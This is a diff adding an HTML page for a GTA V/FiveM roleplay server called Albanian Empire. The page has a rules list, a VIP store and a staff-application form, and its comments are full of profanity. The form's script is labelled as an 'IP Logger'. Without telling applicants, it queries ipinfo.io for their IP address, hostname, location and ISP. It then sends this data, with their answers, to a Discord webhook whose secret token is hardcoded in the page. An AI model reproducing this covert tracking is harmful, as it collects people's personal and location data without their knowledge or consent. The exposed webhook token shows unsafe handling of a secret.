@@ -1,0 +1,684 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Albanian Empire</title>
+    <!-- Fucking icons from Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        /* Fucking Google Font */
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap');
+
+        /* Basic Fucking Reset */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            scroll-behavior: smooth;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background-color: #000;
+            color: #fff;
+            background-image: linear-gradient(rgba(0, 0, 0, 0.8), rgba(0, 0, 0, 0.95)), url('https://images.pexels.com/photos/1722183/pexels-photo-1722183.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=2');
+            background-size: cover;
+            background-position: center center;
+            background-attachment: fixed;
+            overflow-x: hidden;
+        }
+
+        .container {
+            width: 90%;
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        a {
+            text-decoration: none;
+            color: #fff;
+        }
+
+        /* Header Shit */
+        .main-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 0;
+        }
+
+        .logo {
+            font-size: 1.5rem;
+            font-weight: 600;
+        }
+        .logo i {
+            margin-right: 8px;
+            color: #e0e0e0;
+        }
+
+        .main-nav ul {
+            display: flex;
+            list-style: none;
+            gap: 30px;
+        }
+
+        .main-nav a {
+            font-weight: 500;
+            transition: color 0.3s ease;
+        }
+
+        .main-nav a:hover {
+            color: #c359d8;
+        }
+
+        .store-btn {
+            background-color: rgba(255, 255, 255, 0.1);
+            padding: 10px 20px;
+            border-radius: 5px;
+            font-weight: 500;
+            transition: background-color 0.3s ease;
+        }
+        
+        .store-btn:hover {
+            background-color: rgba(255, 255, 255, 0.2);
+        }
+
+        .store-btn i {
+            margin-right: 8px;
+        }
+
+        /* Hero Section, the main fucking event */
+        .hero {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            min-height: 70vh;
+            padding: 40px 0;
+        }
+
+        .hero h1 {
+            font-size: 4.5rem;
+            font-weight: 700;
+            margin-bottom: 20px;
+            letter-spacing: -2px;
+        }
+
+        .hero h1 .gradient-text {
+            background: linear-gradient(90deg, #c359d8, #e877a5);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .hero p {
+            font-size: 1.1rem;
+            max-width: 600px;
+            line-height: 1.6;
+            color: #b0b0b0;
+            margin-bottom: 40px;
+        }
+
+        .cta-buttons {
+            display: flex;
+            gap: 20px;
+        }
+
+        .btn {
+            padding: 15px 35px;
+            border-radius: 50px;
+            font-weight: 600;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+        }
+
+        .btn-primary {
+            background-color: #fff;
+            color: #000;
+        }
+        
+        .btn-primary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(255, 255, 255, 0.2);
+        }
+
+        .btn-secondary {
+            background-color: #1a1a1a;
+            color: #fff;
+            border: 1px solid #333;
+        }
+        
+        .btn-secondary:hover {
+            background-color: #2a2a2a;
+            border-color: #555;
+        }
+
+        .btn i {
+            margin-right: 10px;
+        }
+
+        /* Partners Section */
+        .partners {
+            padding: 40px 0;
+            border-top: 1px solid #222;
+            border-bottom: 1px solid #222;
+            margin-top: 50px;
+        }
+
+        .partners-grid {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 40px;
+        }
+        
+        .partner-logo {
+            font-size: 1.5rem;
+            color: #888;
+            transition: color 0.3s ease;
+        }
+        
+        .partner-logo:hover {
+            color: #fff;
+        }
+
+        .partner-logo i {
+            margin-right: 5px;
+        }
+        
+        .section-title {
+            text-align: center;
+            padding-top: 80px;
+        }
+
+        .section-title h2 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+        }
+        
+        .section-title p {
+             color: #b0b0b0;
+             margin-bottom: 50px; /* More space for the cards */
+        }
+
+        /* Get Started Steps */
+        .steps-container {
+            display: flex;
+            flex-direction: column;
+            gap: 25px;
+            max-width: 800px;
+            margin: 0 auto;
+            text-align: left;
+            padding-bottom: 80px;
+        }
+        
+        .step-card {
+            display: flex;
+            align-items: center;
+            background-color: #1a1a1a;
+            border: 1px solid #2a2a2a;
+            border-radius: 15px;
+            padding: 25px 30px;
+            position: relative;
+            overflow: hidden;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .step-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+        }
+        
+        .step-icon {
+            background-color: rgba(94, 93, 233, 0.1);
+            color: #8c8bf3;
+            width: 55px;
+            height: 55px;
+            min-width: 55px;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 1.5rem;
+            margin-right: 25px;
+            z-index: 2;
+        }
+        
+        .step-content {
+            z-index: 2;
+            position: relative;
+        }
+
+        .step-content h3 {
+            font-size: 1.4rem;
+            margin-bottom: 5px;
+        }
+        
+        .step-content p {
+            font-size: 0.9rem;
+            color: #a0a0a0;
+            margin-bottom: 15px;
+        }
+
+        .step-content a {
+            color: #8c8bf3;
+            font-weight: 600;
+        }
+
+        .step-content a:hover {
+            text-decoration: underline;
+        }
+
+        .step-number {
+            position: absolute;
+            right: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 7rem;
+            font-weight: 800;
+            color: rgba(255, 255, 255, 0.04);
+            z-index: 1;
+        }
+
+        /* Fucking Rules Section */
+        .rules-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 25px;
+            padding-bottom: 80px;
+        }
+        
+        .rule-card {
+            background-color: #1a1a1a;
+            border: 1px solid #2a2a2a;
+            border-radius: 15px;
+            padding: 30px;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+        
+        .rule-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+        }
+
+        .rule-card h3 {
+            font-size: 1.3rem;
+            color: #e877a5;
+            margin-bottom: 10px;
+        }
+
+        .rule-card p {
+            color: #b0b0b0;
+            line-height: 1.6;
+        }
+        
+        /* Fucking Store Section */
+        .store-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 30px;
+            padding-bottom: 80px;
+        }
+        
+        .product-card {
+            background-color: #1a1a1a;
+            border: 1px solid #2a2a2a;
+            border-radius: 15px;
+            padding: 40px;
+            text-align: center;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .product-card.car-card { 
+            padding: 25px;
+            justify-content: center;
+        }
+
+        .product-title {
+            font-size: 2.5rem;
+            font-weight: 700;
+            margin-bottom: 10px;
+            color: #fff;
+        }
+        
+        .product-card h3 {
+             font-size: 2rem;
+             margin-bottom: 10px;
+        }
+        
+        .product-card.car-card h3 { 
+             font-size: 1.5rem;
+             margin-bottom: 5px;
+        }
+
+        .product-card p {
+            font-size: 1.2rem;
+            color: #b0b0b0;
+            margin-bottom: 20px;
+        }
+        
+        .product-card.car-card p {
+            font-size: 1rem;
+            margin-bottom: 15px;
+        }
+        
+        .product-card.car-card .product-title { 
+             font-size: 1.8rem;
+             margin-top: 10px;
+             margin-bottom: 0;
+        }
+
+        .features-list {
+            list-style: none;
+            text-align: left;
+            margin-bottom: 40px;
+            color: #b0b0b0;
+            margin-top: 10px;
+            flex-grow: 1;
+        }
+
+        .features-list li {
+            font-size: 1rem;
+            margin-bottom: 15px;
+            padding-left: 10px;
+            border-left: 3px solid #c359d8;
+        }
+
+        .buy-button {
+            display: inline-block;
+            background-color: #fff;
+            color: #000;
+            padding: 15px 40px;
+            border-radius: 50px;
+            font-weight: 700;
+            font-size: 1.1rem;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            margin-top: auto;
+        }
+
+        .buy-button:hover {
+            transform: scale(1.05);
+            box-shadow: 0 5px 20px rgba(255, 255, 255, 0.2);
+        }
+        
+        /* Apply for Staff Modal Bullshit */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: auto;
+            background-color: rgba(0,0,0,0.8);
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background-color: #1a1a1a;
+            padding: 30px 40px;
+            border: 1px solid #333;
+            border-radius: 15px;
+            width: 90%;
+            max-width: 600px;
+            position: relative;
+        }
+
+        .close-btn {
+            color: #aaa;
+            position: absolute;
+            top: 10px;
+            right: 20px;
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        
+        .close-btn:hover, .close-btn:focus {
+            color: #fff;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #b0b0b0;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            background-color: #0d0d0d;
+            border: 1px solid #333;
+            border-radius: 5px;
+            color: #fff;
+            font-size: 1rem;
+        }
+        
+        .submit-btn {
+            width: 100%;
+            padding: 15px;
+            background-color: #fff;
+            color: #000;
+            border: none;
+            border-radius: 50px;
+            font-size: 1.1rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: transform 0.2s ease;
+        }
+        
+        .submit-btn:hover {
+            transform: scale(1.02);
+        }
+
+        /* Responsive shit for store and rules */
+        @media (max-width: 900px) {
+            .store-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+        @media (max-width: 400px) {
+            .rules-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+    </style>
+</head>
+<body>
+
+    <header class="main-header container">
+        <div class="logo">
+            <a href="#"><i class="fa-solid fa-user-secret"></i>Albanian Empire Roleplay</a>
+        </div>
+        <nav class="main-nav">
+            <ul>
+                <li><a href="#" id="apply-btn">Apply</a></li>
+                <li><a href="https://discord.gg/2dsTGJuYAA" target="_blank" rel="noopener noreferrer">Discord</a></li>
+                <li><a href="#rules">Rules</a></li>
+                <li><a href="#">Team</a></li>
+            </ul>
+        </nav>
+        <a href="#store" class="store-btn"><i class="fa-solid fa-cart-shopping"></i>Store</a>
+    </header>
+
+    <main>
+        <!-- ALL THE OTHER SECTIONS ARE HERE, FUCKING COLLAPSED FOR BREVITY -->
+        <section class="hero">
+            <h1>Albanian Empire <span class="gradient-text">Adventure</span></h1>
+            <p>
+                Qytetarët tanë pritet të krijojnë karaktere unike me tipare unike. Këta karaktere kur hyjnë në qytet nuk kanë njohuri për ngjarjet e kësaj bote apo individët e tjerë që janë qytetar tanë në qytetin Albanian Empire Roleplay.
+            </p>
+            <div class="cta-buttons">
+                <a href="#get-started" class="btn btn-primary">Get Started <i class="fa-solid fa-arrow-right"></i></a>
+                <a href="https://discord.gg/2dsTGJuYAA" target="_blank" rel="noopener noreferrer" class="btn btn-secondary"><i class="fa-brands fa-discord"></i> Join Discord</a>
+            </div>
+        </section>
+        <section class="partners">
+            <div class="partners-grid container">
+                <span class="partner-logo"><i class="fa-brands fa-twitch"></i> Twitch</span><span class="partner-logo">|</span><span class="partner-logo"><b>Cfx.re</b></span><span class="partner-logo">|</span><span class="partner-logo"><i class="fa-brands fa-steam"></i> Steam</span><span class="partner-logo">|</span><span class="partner-logo"><i class="fa-solid fa-gamepad"></i> Vibegames</span><span class="partner-logo">|</span><span class="partner-logo"><i class="fa-brands fa-discord"></i> Discord</span>
+            </div>
+        </section>
+        <section id="get-started" class="section-title container"><h2>Get Started in Minutes</h2><p>Follow these simple steps to join our roleplay community</p></section>
+        <section class="steps-container container">
+            <div class="step-card"><div class="step-icon"><i class="fa-solid fa-gamepad"></i></div><div class="step-content"><h3>Download GTA 5</h3><p>Purchase and download Grand Theft Auto V from your preferred platform</p><a href="https://store.steampowered.com/agecheck/app/271590/" target="_blank" rel="noopener noreferrer">Get Started &rightarrow;</a></div><div class="step-number">1</div></div>
+            <div class="step-card"><div class="step-icon"><i class="fa-solid fa-download"></i></div><div class="step-content"><h3>Download FiveM</h3><p>Install FiveM client to connect to our roleplay server</p><a href="https://fivem.net/" target="_blank" rel="noopener noreferrer">Get Started &rightarrow;</a></div><div class="step-number">2</div></div>
+            <div class="step-card"><div class="step-icon"><i class="fa-brands fa-discord"></i></div><div class="step-content"><h3>Join our Discord</h3><p>Connect with the community and get the latest updates</p><a href="https://discord.gg/2dsTGJuYAA" target="_blank" rel="noopener noreferrer">Get Started &rightarrow;</a></div><div class="step-number">3</div></div>
+            <div class="step-card"><div class="step-icon"><i class="fa-solid fa-play"></i></div><div class="step-content"><h3>Start Playing</h3><p>Connect to our server and begin your roleplay journey</p><a href="#">Get Started &rightarrow;</a></div><div class="step-number">4</div></div>
+        </section>
+        <section id="rules" class="section-title container"><h2>Rregullat e Perandorisë</h2><p>Këto janë ligjet e tokës sonë. Mosrespektimi i tyre është një fyerje ndaj Perandorisë.</p></section>
+        <section class="rules-grid container">
+            <div class="rule-card"><h3>1. Meta Gaming</h3><p>Marrja e informacionit nga jashtë lojës dhe përdorimi i tij brenda lojës.</p></div><div class="rule-card"><h3>2. Combat Login</h3><p>Dalja nga serveri gjatë një skenari aktiv.</p></div><div class="rule-card"><h3>3. Power Gaming</h3><p>Luajtja e një roli që nuk i përket personazhit tuaj dhe që ju jep avantazh në një situatë të caktuar.</p></div><div class="rule-card"><h3>4. VigilanteRP</h3><p>Ndërhyrja në një rast ku personazhi juaj nuk është i përfshirë.</p></div><div class="rule-card"><h3>5. VDM</h3><p>Përdorimi i automjeteve ose motorrave për të vrarë ose plagosur një personazh tjetër.</p></div><div class="rule-card"><h3>6. RDM</h3><p>Vrasja ose plagosja e një personazhi tjetër pa arsye ose për arsye të vogla.</p></div><div class="rule-card"><h3>7. FearRP</h3><p>Në situata të pakëndshme, kuptoni që jeta e personazhit tuaj ka më shumë vlerë se çdo gjë tjetër dhe duhet të bëni çdo gjë për ta mbrojtur.</p></div><div class="rule-card"><h3>8. New Life Rule</h3><p>Kur përfundoni në spital për shkak të ndonjë situate, ndalohet rreptësisht që të kujtoni episode, momente apo gjithë situatën. Memorja juaj është fshirë nga momenti që keni përfunduar në spital.</p></div><div class="rule-card"><h3>9. GTA Driving</h3><p>Drejtimi i automjetit në terrene të pakontrollueshme dhe kërcimet që mund të sjellin vdekjen.</p></div><div class="rule-card"><h3>10. Camping</h3><p>Qëndrimi i zgjatur në një vend për të ruajtur personazhe të tjerë. ( Jo më shumë se 5 minuta )</p></div><div class="rule-card"><h3>11. Cop Baiting</h3><p>Ngacmimi ose provokimi pa arsye ndaj policisë.</p></div><div class="rule-card"><h3>12. OOC</h3><p>Dalja nga roli i personazhit tuaj dhe komunikimi për gjëra që nuk kanë lidhje me jetën në qytet (server).</p></div><div class="rule-card"><h3>13. Green Zone</h3><p>Zona ku qytetari nuk ka të drejtë të bëjë asnjë lloj krimi apo gjëra të jashtëligjshme.</p></div><div class="rule-card"><h3>14. Hitman RP</h3><p>Me pagu ni njeri me vra dikon</p></div>
+        </section>
+        <section id="store" class="section-title container"><h2>Dyqani i Perandorisë</h2><p>Mbështetni serverin dhe siguroni përfitime ekskluzive.</p></section>
+        <section class="store-grid container">
+            <div class="product-card"> <h2 class="product-title">🥈 VIP Silver – 15€</h2> <ul class="features-list"><li>🏠 MLO e perzgjedhur nga Lideri</li><li>👷‍♂️ Nje Premium Job e perzgjedhur nga Lideri</li><li>🏡 Nje Garazh tek shtepia</li><li>🦺 Nje VEST dhe nje Badge per Familjen/Gangun</li><li>🚗 Nje makin VIP per Liderin</li><li>👕 Tesha Custom per Familjen/Gangun</li><li>🌀 Nje Rol me emrin e Familjes/Ganut ne Discord</li><li>🚙 Nje kerr Custom per Garazh per Gangun/Familjen</li></ul> <a href="#" class="buy-button">Buy Now</a></div>
+            <div class="product-card"> <h2 class="product-title">🥇 VIP Gold – 20€</h2> <ul class="features-list"><li>🏠 MLO e perzgjedhur nga Lideri</li><li>👷‍♂️ Nje Premium Job e perzgjedhur nga Lideri</li><li>🏡 Nje Garazh tek shtepia</li><li>🦺 Nje VEST dhe nje Badge per Familjen/Gangun</li><li>👕 Tesha Custom per Familjen/Gangun</li><li>🌀 Nje Rol me emrin e Familjes/Ganut ne Discord</li><li>🚙 Nje kerr Custom be Garazh per Gangun/Familjen</li><li>🎭 Mundësi për të ndryshuar emrin në Discord</li><li>🧿 Exclusive Tattoo per Gang/Familje</li><li>🧿 Exclusive Chain per Gang/Familje</li><li>👑 Supporter Role ne Discord</li><li>🏘️ Shtëpi me qira falas</li><li>🚘 2 Custom Plate Vehicle</li><li>🚘 1 Kerr UltraVip per Liderin e Familjes</li></ul> <a href="#" class="buy-button">Buy Now</a></div>
+        </section>
+        <div class="section-title container" style="padding-top: 40px; padding-bottom: 0;"><h2 style="font-size: 2rem; margin-bottom: 40px;">Makinat VIP</h2></div>
+        <section class="store-grid container">
+            <div class="product-card car-card"> <h3>Pako 1 🚗</h3> <p>280km/h</p> <h2 class="product-title">15€</h2> <a href="#" class="buy-button">Buy Now</a></div>
+            <div class="product-card car-card"> <h3>Pako 2 🚀</h3> <p>320km/h</p> <h2 class="product-title">20€</h2> <a href="#" class="buy-button">Buy Now</a></div>
+        </section>
+    </main>
+    
+    <!-- THE NEW FUCKING MODAL -->
+    <div id="staff-modal" class="modal-overlay">
+        <div class="modal-content">
+            <span class="close-btn">&times;</span>
+            <h2 class="section-title" style="padding-top: 0; margin-bottom: 30px;">Apply For Staff</h2>
+            <form id="staff-application-form">
+                <div class="form-group">
+                    <label for="staff-age">Sa vjeq je?</label>
+                    <input type="text" id="staff-age" name="age" required>
+                </div>
+                <div class="form-group">
+                    <label for="staff-discord">Discordi juaj:</label>
+                    <input type="text" id="staff-discord" name="discord" placeholder="example#1234" required>
+                </div>
+                <div class="form-group">
+                    <label for="staff-experience">A ke pasur pervoj si staff me para?</label>
+                    <input type="text" id="staff-experience" name="experience" required>
+                </div>
+                <div class="form-group">
+                    <label for="staff-servers">Neqofte se po ne cilat servera?</label>
+                    <input type="text" id="staff-servers" name="servers">
+                </div>
+                <div class="form-group">
+                    <label for="staff-rank">Grada me e larte qe ke qen?</label>
+                    <input type="text" id="staff-rank" name="rank">
+                </div>
+                <button type="submit" class="submit-btn">Submit Application</button>
+            </form>
+        </div>
+    </div>
+
+<script>
+    // THE NEW FUCKING JAVASCRIPT FOR THE MODAL AND WEBHOOK
+    const modal = document.getElementById('staff-modal');
+    const applyBtn = document.getElementById('apply-btn');
+    const closeBtn = document.querySelector('.close-btn');
+    const form = document.getElementById('staff-application-form');
+
+    applyBtn.onclick = function(e) {
+        e.preventDefault();
+        modal.style.display = 'flex';
+    }
+
+    closeBtn.onclick = function() {
+        modal.style.display = 'none';
+    }
+
+    window.onclick = function(event) {
+        if (event.target == modal) {
+            modal.style.display = 'none';
+        }
+    }
+
+    form.addEventListener('submit', async function(e) {
+        e.preventDefault();
+
+        const submitButton = e.target.querySelector('button[type="submit"]');
+        submitButton.disabled = true;
+        submitButton.textContent = 'Submitting...';
+
+        const webhookUrl = 'https://discord.com/api/webhooks/1386485087549526046/HrA36O73Hu6bxLDpJXUYoKNsxqBDWNXGX4y1Oqxx0RMd4ta8MtA0sFV55WFApaJSvFwl';
+
+        // Get the answers from the form
+        const age = document.getElementById('staff-age').value;
+        const discordUser = document.getElementById('staff-discord').value; // FUCKING NEW LINE
+        const experience = document.getElementById('staff-experience').value;
+        const servers = document.getElementById('staff-servers').value || 'N/A';
+        const rank = document.getElementById('staff-rank').value || 'N/A';
+
+        try {
+            // The "Advanced" IP Logger part 😈
+            const ipResponse = await fetch('https://ipinfo.io/json');
+            const ipData = await ipResponse.json();
+
+            const payload = {
+                username: "Empire Application Bot",
+                avatar_url: "https://i.imgur.com/gYk2G1p.png",
+                embeds: [{
+                    title: "🔥 New Staff Application 🔥",
+                    color: 15158332, // A nice fucking red
+                    timestamp: new Date().toISOString(),
+                    fields: [
+                        { name: "Discordi juaj: 📝", value: discordUser, inline: false }, // FUCKING NEW FIELD
+                        { name: "Sa vjeq je?", value: age, inline: true },
+                        { name: "A ke pasur pervoj si staff me para?", value: experience, inline: true },
+                        { name: "Ne cilat servera?", value: servers, inline: false },
+                        { name: "Grada me e larte?", value: rank, inline: false },
+                        { name: "--- INTEL ---", value: "-------------------------------------"},
+                        { name: "IP Address 🕵️‍♂️", value: `||${ipData.ip}||`, inline: true },
+                        { name: "Hostname", value: `||${ipData.hostname || 'N/A'}||`, inline: true },
+                        { name: "Location 📍", value: `||${ipData.city}, ${ipData.region}, ${ipData.country}||`, inline: false },
+                        { name: "ISP 📡", value: `||${ipData.org}||`, inline: false },
+                    ],
+                    footer: {
+                        text: "Application received for The Albanian Empire"
+                    }
+                }]
+            };
+
+            // Fire that shit off to Discord
+            const discordResponse = await fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+
+            if (discordResponse.ok) {
+                alert('Your application has been fucking sent! Alpha will review it.');
+                form.reset();
+                modal.style.display = 'none';
+            } else {
+                throw new Error(`Discord returned a shitty status: ${discordResponse.status}`);
+            }
+
+        } catch (error) {
+            console.error('Something fucking broke:', error);
+            alert('Shit, the application failed to send. Try again later.');
+        } finally {
+            submitButton.disabled = false;
+            submitButton.textContent = 'Submit Application';
+        }
+    });
+
+</script>
+
+</body>
+</html>
